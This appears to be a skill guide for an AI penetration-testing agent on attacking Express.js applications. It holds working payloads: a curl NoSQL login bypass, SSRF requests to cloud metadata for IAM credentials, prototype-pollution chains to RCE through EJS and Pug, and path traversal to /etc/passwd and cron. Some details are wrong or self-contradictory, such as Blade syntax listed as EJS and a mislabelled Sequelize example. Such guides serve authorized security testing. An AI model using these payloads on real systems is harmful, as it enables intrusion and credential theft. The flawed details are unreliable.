---
name: express
description: Express.js security testing covering middleware order, prototype pollution, JWT/REST misconfig, Server-Side Prototype Abuse, NoSQL injection, SSRF in request libraries, and Node.js ecosystem-specific patterns
---

# Express.js

Express is the de-facto Node.js web framework. It has minimal built-in security (intentionally — for flexibility), so security depends on the middleware chain in correct order, the use of `helmet`, and avoiding well-known npm sinks (prototype pollution, NoSQL injection, SSRF, deserialization). Most Express vulns are: middleware order, `body-parser` quirks, `express.static` path traversal, prototype pollution in merge/assign calls, and misuse of `child_process`/`eval`/`fs` on user input.

**For language-level deserialization (Node.js `node-serialize`, `js-yaml`, lodash template, JSON.parse with reviver), see the `deserialization` skill. For prototype pollution in detail, see the `prototype_pollution` skill. This skill covers Express-specific patterns.**

## Attack Surface

**Core Surfaces**
- Routes: `app.get/post/put/delete`, `Router()`, `route()`
- Middleware: order matters, single `next(err)` halts the chain
- `app.use(express.json())`, `app.use(express.urlencoded())`, `app.use(cookie-parser())`
- `app.use(express.static('public'))` — file serving
- Request object: `req.body`, `req.query`, `req.params`, `req.headers`, `req.cookies`, `req.session`
- Response: `res.send()`, `res.json()`, `res.render()`, `res.redirect()`, `res.sendFile()`
- Error handler: `(err, req, res, next) => {}` — only registered last catches errors

**High-Risk Middleware**
- `express-session` with file store (session files in `./sessions`)
- `cookie-session` — sets signed cookies (uses `cookie-signature` package)
- `passport` / `passport-jwt` / `passport-local` / `passport-oauth2`
- `csurf` (deprecated but still seen) — CSRF tokens
- `helmet` — sets CSP, HSTS, X-Frame-Options, etc.
- `cors` (`express-cors` package) — CORS handling
- `express-rate-limit` — rate limiting
- `compression` — gzip
- `morgan` — request logging (may log auth headers)
- `multer` — file upload
- `body-parser` (now in Express built-in) — body parsing
- `express-validator` — input validation

**Default Misconfigs**
- `app.use(cors())` — allows all origins
- `app.use(cors({ credentials: true, origin: true }))` — reflects origin + credentials
- `app.use(express.static('public'))` without path check
- `app.disable('etag')` or `app.disable('x-powered-by')` missing
- `app.set('trust proxy', true)` — without reverse proxy validation

**Request Libraries (SSRF sinks)**
- `axios.get()` / `axios.post()`
- `node-fetch`
- `got` (modern)
- `request` (deprecated but widespread)
- `needle`, `superagent`
- `http` / `https` (built-in)
- `gaxios` (Google's, used in GCP SDKs)
- `undici` (newer, faster)

**Templates**
- EJS (`res.render('view', { ... })`) — SSTI via `__proto__` (CVE-2022-29078)
- Pug (`res.render('view', { ... })`) — SSTI via `__proto__.block` (CVE-2021-21353)
- Handlebars (`res.render('view', { ... })`) — SSTI via `__proto__` (CVE-2019-19919)
- Nunjucks — SSTI
- Mustache — limited (no function calls)
- Dust.js

**Database Drivers (SQL/NoSQL injection)**
- `mongoose` (MongoDB ODM) — `.find()`, `.findOne()`, `.findById()`
- `mongodb` native
- `mysql2`, `mysql`
- `pg` (PostgreSQL)
- `sequelize` (ORM)
- `knex` (query builder)
- `prisma` (modern ORM)
- `drizzle-orm` (modern TS ORM)
- `typeorm`
- `redis` (key-value, Lua eval)
- `elasticsearch` (legacy)

## Reconnaissance

**Server identification**
- `X-Powered-By: Express` (if not disabled)
- 404 page: `Cannot GET /path` (Express default)
- Error handler: `stack: at ... (file.js:line:col)` if dev mode
- `Set-Cookie: connect.sid=...` (express-session default)
- `Set-Cookie: connect.sid=s%3A...` (signed session ID)
- `Server: cloudflare` (often behind CDN)

**Version detection**
- `package.json` in source — `dependencies.express`
- `package-lock.json`
- Headers may include `X-Powered-By: Express` (the version is in there sometimes, e.g., `X-Powered-By: Express 4.17.1` — older versions)
- Error pages include Express version

**Hidden endpoints**
- `GET /api`, `GET /api/`, `GET /api/v1/`
- `GET /api/docs`, `GET /swagger`, `GET /api-docs` (Swagger UI)
- `GET /api/users`, `GET /api/admin`
- `GET /graphql` (Apollo Server)
- `GET /health`, `GET /metrics` (Prometheus)
- `GET /__webpack_hmr` (dev server)
- `GET /socket.io/?EIO=4&transport=polling` (Socket.IO)
- Source `app.use()` / `app.get()` calls

**Source-map disclosure:**
```bash
curl https://target.com/static/js/main.js.map
# Source maps expose original source code
```

## Key Vulnerabilities

### Middleware Order Bugs

Express middleware runs in registration order. Common mistakes:

**Auth middleware registered after route:**
```javascript
// VULNERABLE
app.use(express.json());
app.post('/api/users', createUser);  // ← no auth check
app.use(authenticate);  // ← registered AFTER route
```

**Error handler that swallows errors:**
```javascript
app.use((err, req, res, next) => {
  console.error(err);  // logs but doesn't respond
  // next(err) not called → request hangs OR res never sent
});
```

**Static file serving before auth:**
```javascript
// VULNERABLE
app.use(express.static('private-files'));  // ← serves private files
app.use(authenticate);
```

**Helmet missing or before body parser:**
```javascript
// VULNERABLE: helmet never set
app.use(express.json());
app.use(cookieParser());
// should be: app.use(helmet()); early in the chain
```

**CORS before auth:**
```javascript
// VULNERABLE
app.use(cors({ origin: '*' }));  // CORS preflight OK
app.use(authenticate);  // but preflight returns 200 without auth
// Result: preflight passes, but actual request still needs auth
// But: cookie auth via CORS + credentials works (see cors_misconfiguration skill)
```

**Cookie parser before sessions:**
```javascript
// Standard order: cookieParser → session
app.use(cookieParser('secret'));
app.use(session({...}));  // OK
// VULNERABLE if reversed
app.use(session({...}));  // session needs cookies
app.use(cookieParser('secret'));  // too late
```

### `body-parser` Quirks

**`extended: true` enables `qs` parsing → prototype pollution risk:**
```javascript
// VULNERABLE (qs < 6.0.4)
app.use(express.urlencoded({ extended: true }));
// Attacker sends: __proto__[isAdmin]=1
```

**Default `limit` is 100kb:**
```javascript
// VULNERABLE to large payload DoS if no limit set
app.use(express.json());
// Attacker sends 10MB JSON → memory pressure
```

**Type coercion by `qs`:**
```javascript
// Express sees: ?id[__proto__]=1
// qs parses to: { id: { __proto__: '1' } }
// Some handlers then `Object.assign({id: ...})` → pollution
```

### `express.static` Path Traversal

**`express.static` with user-controlled path:**
```javascript
// VULNERABLE
app.get('/files/*', (req, res) => {
  res.sendFile(req.params[0]);  // ← path traversal
});
// Request: /files/../../etc/passwd
```

**CVE-2024-29041** (older Express 4.x): `res.redirect()` with user-controlled URL allowed `javascript:` redirects.

**`express.static` with `dotfiles` option:**
```javascript
// VULNERABLE: `dotfiles: 'allow'` serves .env, .git, .htaccess
app.use(express.static('public', { dotfiles: 'allow' }));
// Default is 'ignore' which is safe
```

### JWT Middleware Issues

**`jsonwebtoken` library version-dependent bugs:**
- `< 4.2.2` — `verify` allows `alg: none` if `algorithms` not specified
- `< 9.0.0` — various signature bypass issues
- `jose` library — CVE-2022-23529, CVE-2022-23539, CVE-2022-23540 (DoS, prototype pollution)

**Common misconfig:**
```javascript
// VULNERABLE: no algorithms option means library accepts whatever the token says
jwt.verify(token, secret);  // accepts alg=none, alg confusion, etc.

// SECURE
jwt.verify(token, secret, { algorithms: ['HS256'] });
```

**`express-jwt` and `express-jwt-permissions`:**
- Missing `algorithms` option → alg confusion
- `request.auth` is the decoded token — if downstream code reads it without validation, attacker controls claims

**Bearer token in cookie vs header:**
- If session cookie is the JWT → CSRF applicable
- If Authorization header is the JWT → CORS+credentials can leak it (XSS mostly)
- SameSite=None needed for cross-origin — risky

### CORS Misconfigurations

Common in Express:
```javascript
// VULNERABLE
app.use(cors());  // Access-Control-Allow-Origin: *

// VULNERABLE — reflects origin
app.use(cors({
  origin: true,  // reflects request origin
  credentials: true  // with credentials — kill combo
}));

// VULNERABLE — bad regex
app.use(cors({
  origin: /target\.com$/,  // allows evil.target.com
  credentials: true
}));
```

See `cors_misconfiguration` skill for full details.

### NoSQL Injection

MongoDB query injection (most common in Express):
```javascript
// VULNERABLE
User.findOne({ email: req.body.email, password: req.body.password });
// Attacker sends: { "email": "admin@x.c", "password": { "$ne": "" } }
// → password is always not-equal to "" → login as admin
```

**NoSQL operator bypass:**
- `$ne` — not equal
- `$gt` — greater than
- `$regex` — regex match
- `$where` — JS execution (MongoDB 3.x+ removed, but $function still works in 4.2+)
- `$exists` — exists
- `$in` — in array

**Test:**
```bash
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@x.c", "password": {"$ne": ""}}'
```

**`$where` JS execution (very old MongoDB):**
```json
{"$where": "function() { return true; }"}
// Or:
{"$where": "this.username == 'admin' || 1==1"}
```

**Detection:**
```bash
grep -rn "\.find(\|\.findOne(\|\.findById(\|\.update(\|\.remove(" --include="*.js" --include="*.ts" app/
```

**`mongoose` query injection:**
- `Model.find({ _id: req.body.id })` — if `id` is `{$gt: ""}`, returns all
- `Model.findById(req.query.id)` — `id` is string-cast, less risky but still test

**`mongodb` native:**
- `db.collection('users').findOne({ ... })` — same risks

**Sanitization:**
- `mongo-sanitize` / `express-mongo-sanitize` — strip `$` and `.` from user input
- Use `mongodb-sanitize` or `express-mongo-sanitize` middleware
- Use Mongoose's `.set()` for known fields, or strict schemas

### SQL Injection

**Sequelize:**
```javascript
// VULNERABLE
User.findAll({ where: { name: req.query.name } });  // SECURE (parameterized)
// VULNERABLE
sequelize.query(`SELECT * FROM users WHERE name = '${req.query.name}'`);
// VULNERABLE
User.findAll({ where: { [Op.or]: req.body } });  // arbitrary keys
```

**`knex`:**
```javascript
// VULNERABLE
knex.raw(`SELECT * FROM users WHERE name = '${req.query.name}'`);
// SECURE
knex('users').where({ name: req.query.name });
```

**`pg` / `node-postgres`:**
```javascript
// VULNERABLE
pool.query(`SELECT * FROM users WHERE id = ${req.id}`);
// SECURE
pool.query('SELECT * FROM users WHERE id = $1', [req.id]);
```

### SSRF in Request Libraries

**Unvalidated URL passed to axios/node-fetch:**
```javascript
// VULNERABLE
app.get('/api/proxy', async (req, res) => {
  const response = await axios.get(req.query.url);
  res.json(response.data);
});
// Attacker: ?url=http://169.254.169.254/latest/meta-data/
```

**Server-side request forgery via `res.redirect()`:**
```javascript
// VULNERABLE
res.redirect(req.query.next);  // open redirect
// But also SSRF if a server-side actor clicks the redirect
```

**Bypass URL validation:**
```javascript
// VULNERABLE validation
function isSafeUrl(url) {
  const parsed = new URL(url);
  return parsed.hostname.endsWith('target.com');  // evil.target.com bypasses
}
function isSafeUrl2(url) {
  return !url.includes('localhost') && !url.includes('127.0.0.1');  // bypassed with 0.0.0.0, 127.1, [::1], etc.
}
```

**Test:**
```bash
# IMDSv1
curl 'https://target.com/api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'

# IMDSv2 requires token — but SSRF can do PUT
curl -X PUT 'https://target.com/api/proxy?method=PUT&url=http://169.254.169.254/latest/api/token&header=X-aws-ec2-metadata-token-ttl-seconds:21600'

# Internal services
curl 'https://target.com/api/proxy?url=http://localhost:6379/'  # Redis
curl 'https://target.com/api/proxy?url=http://localhost:9200/'  # Elasticsearch
curl 'https://target.com/api/proxy?url=http://10.0.0.5:8080/'  # Internal

# Bypass DNS rebinding
curl 'https://target.com/api/proxy?url=http://7f000001.7f000002.rbndr.us/'  # rebinder
```

### File Upload Issues (Multer)

**Path traversal in filename:**
```javascript
// VULNERABLE
const upload = multer({ dest: 'uploads/' });
app.post('/upload', upload.single('file'), (req, res) => {
  // req.file.originalname is user-controlled
  fs.rename(`uploads/${req.file.filename}`, `uploads/${req.file.originalname}`);
  // → uploads/../../etc/cron.d/backdoor
});
```

**Content-type spoofing:**
- Multer doesn't validate content type by default
- `.svg` with `<script>` → XSS when served

**Multer CVE-2025-47935** (and earlier): various bugs depending on version.

**Multer destination escape:**
- Old multer had bugs where destination could be controlled
- `diskStorage` with user-controlled `destination` callback

### `res.render` with User Data

**SSTI via prototype pollution + EJS (CVE-2022-29078):**
```javascript
// Pollute via JSON body
{
  "__proto__": {
    "client": true,
    "escapeFunction": "JSON.stringify;process.mainModule.require('child_process').execSync('id')"
  }
}
// Next request that calls res.render() with EJS → RCE
```

**SSTI via Pug (CVE-2021-21353):**
```javascript
// Pollute via merge:
{
  "__proto__": {
    "block": {
      "type": "Text",
      "line": "process.mainModule.require('child_process').execSync('id')"
    }
  }
}
```

See `prototype_pollution` and `deserialization` skills for full chains.

### Open Redirect via `res.redirect`

**`res.redirect` with user input:**
```javascript
// VULNERABLE
res.redirect(req.query.next);
// → ?next=https://evil.com
```

**Bypass URL validation:**
```javascript
// VULNERABLE validation
function isSafeRedirect(url) {
  return url.startsWith('/');  // //evil.com starts with /, but is protocol-relative
}
// //evil.com → redirect to evil.com
function isSafeRedirect2(url) {
  return !url.startsWith('http');  // /\\evil.com starts with /, browser may treat as protocol-relative
}
```

**CVE-2024-29041** (older Express): `res.redirect()` with `javascript:` URL.

### XSS via res.render

**`{!! !!}` in EJS:**
```html
<!-- view.ejs -->
<%- userInput %>  <!-- EJS unescaped, XSS -->
<%= userInput %>  <!-- EJS escaped, safe -->
```

**Pug unescaped output:**
```pug
div= userInput  // escaped
div!= userInput  // unescaped, XSS
```

**Handlebars triple-brace:**
```handlebars
{{{userInput}}}  // unescaped, XSS
{{userInput}}  // escaped, safe
```

### npm `request` Library (Deprecated, Still Common)

`request` package is deprecated but widespread. Has many CVEs:
- CVE-2023-25166 — `oauthSignature` HMAC injection
- Various SSRF bugs
- `qs` prototype pollution in older versions

**Test:**
```bash
npm audit 2>/dev/null | head -20
```

### Other Common Express CVEs (2024-2025)

- **CVE-2024-29041** — `res.redirect()` open redirect
- **CVE-2024-43796** — `body-parser` content-type confusion
- **CVE-2024-47764** — `cookie` package accepts cookie name, path, domain with invalid characters
- **CVE-2024-29415** — `ip` package SSRF via `isPublic()` (SSRF through IP validation bypass)
- **CVE-2025-XXXXX** — check current

Run: `cve_lookup(query="express.js", product="express", is_kev=True)`

## Common Bypass Techniques

**Auth bypass via path normalization:**
- `/admin/../admin` → `/admin` (bypass auth middleware if it only checks `/admin/*`)
- Express `app.use('/admin', authMiddleware)` does NOT match `/admin` (without trailing slash) in some versions
- Test: `curl /admin; curl /Admin; curl /admin/; curl /admin%2f`

**Header-based auth bypass:**
- `X-Forwarded-For: 127.0.0.1` if `trust proxy` is set
- `X-Original-URL: /admin` (some proxies pass through)
- `X-Rewrite-URL: /admin`

**Rate limit bypass:**
- `X-Forwarded-For` rotation
- `User-Agent` rotation
- Cookie change
- IPv6 vs IPv4
- Distributed requests

**CORS bypass:**
- `null` origin from sandboxed iframe
- Subdomain wildcard
- HTTP/HTTPS mismatch
- `Access-Control-Allow-Credentials: true` with reflective origin (kill combo)

**CSRF on JSON endpoints:**
- CORS preflight usually blocks — but preflight may pass if `Content-Type` is `application/x-www-form-urlencoded` (not a custom header)
- Then form-encoded body with `request.body` parsed as JSON? No, but if the app accepts both...

**JWT bypass:**
- `alg: none` if library version vulnerable
- `alg: HS256` with public key (RS256 → HS256 confusion)
- `kid` injection
- `jku` / `x5u` injection
- `exp` not validated
- `aud` / `iss` not validated

## Testing Methodology

1. **Fingerprint** — Express version, middleware in use, template engine, CORS config
2. **Map endpoints** — `app.use`, `app.get`, `app.post`, `Router`, source maps, GraphQL
3. **Test middleware order** — direct access to protected routes, error handler behavior
4. **Test body parsing** — JSON, urlencoded, `qs` quirks
5. **Test CORS** — see `cors_misconfiguration` skill
6. **Test JWT/auth** — see `jwt_tool` skill
7. **Test NoSQL injection** — `{$ne: ""}`, `{$gt: ""}`, `{$regex: ".*"}`
8. **Test SQL injection** — `whereRaw`, raw queries
9. **Test SSRF** — IMDS, localhost, internal services
10. **Test prototype pollution** — `__proto__`, `constructor.prototype`
11. **Test file upload** — path traversal, content-type, SVG XSS
12. **Test redirect** — `res.redirect` with user input
13. **Test template injection** — `{!! !!}`, `@php`, `{{{}}}`
14. **Test session/cookie** — session fixation, cookie forging
15. **Audit npm dependencies** — `npm audit`

## Validation Requirements

- **NoSQL injection**: log in as admin with `{"password": {"$ne": ""}}`, show admin dashboard
- **SQL injection**: `UNION SELECT` or time-based blind, show data extraction
- **SSRF**: hit `http://169.254.169.254/` via the proxy endpoint, show AWS creds in response
- **Prototype pollution + RCE**: pollute `__proto__.escapeFunction`, trigger `res.render`, see `whoami` output
- **CORS+credentials**: real browser PoC reads user data cross-origin
- **Path traversal**: read `../../../etc/passwd` or `.env`
- **XSS via template**: headless browser executes `<script>` from user input
- **Open redirect**: `res.redirect` to attacker domain, see redirect in browser
- **JWT bypass**: forged token (alg=none or alg confusion) accepted, hit protected endpoint

## False Positives

- CORS allows `*` but no sensitive endpoints (often the case for fully public APIs)
- `extended: true` URL parser used but `qs` version is patched (≥ 6.0.4)
- `res.redirect` with user input but starts-with `/` check + URL normalization applied
- NoSQL operator in body but `mongo-sanitize` middleware applied
- SSRF endpoint exists but blocks `localhost`, `127.0.0.1`, private IPs (check for `0.0.0.0`, `127.1`, DNS rebinding bypasses)
- Auth middleware present but order is correct
- Multer with custom `fileFilter` that rejects non-allowed types
- `helmet` set with all security headers
- `express-session` cookie has `httpOnly: true, secure: true, sameSite: 'strict'`
- Dependencies show vulnerabilities but locked to safe versions in `package-lock.json`
- App behind WAF that strips prototype pollution keys from JSON

## Impact

- **Critical**: RCE via template engine prototype pollution (ejs/pug/handlebars)
- **Critical**: SSRF to cloud metadata → AWS creds
- **Critical**: NoSQL injection → admin access without password
- **High**: SQL injection → DB compromise
- **High**: Path traversal in `express.static` or `res.sendFile` → source code / `.env` / SSH keys
- **High**: Open redirect → phishing / OAuth abuse
- **Medium**: CORS misconfig + credentials → cross-origin data theft
- **Medium**: XSS via template / SVG upload
- **Chain**: prototype pollution → template injection → RCE in one request
- **Chain**: SSRF → cloud creds → full account compromise

## Cross-References

- **`deserialization` skill** — node-serialize, js-yaml, lodash template
- **`prototype_pollution` skill** — full chain details
- **`cors_misconfiguration` skill** — Express CORS patterns
- **`jwt_tool` skill** — JWT bypass techniques
- **`oauth2_oidc` skill** — Passport.js OAuth flows
- **`sql_injection` skill** — Sequelize, Knex, raw queries
- **`xss` skill** — template engine SSTI
- **`cve_lookup` tool** — current npm package CVEs

## Tooling Checklist

- **npm audit** — vulnerable dependency detection
- **snyk test** — more thorough than npm audit
- **semgrep** with `p/javascript`, `p/typescript`, `p/nodejs`, `p/express` rules
- **nodejsscan** — Node.js static analysis
- **retire.js** — old jQuery and other library detection
- **eslint-plugin-security** — generic JS security rules
- **Express middleware audit** — check order, helmet, cors
- **Proxy tools** for replaying mutated requests
- **interactsh** for OOB SSRF confirmation
- **nuclei** with `p/exposures` and CVE templates
- **prototype-pollution** / **pp-finder** for runtime detection
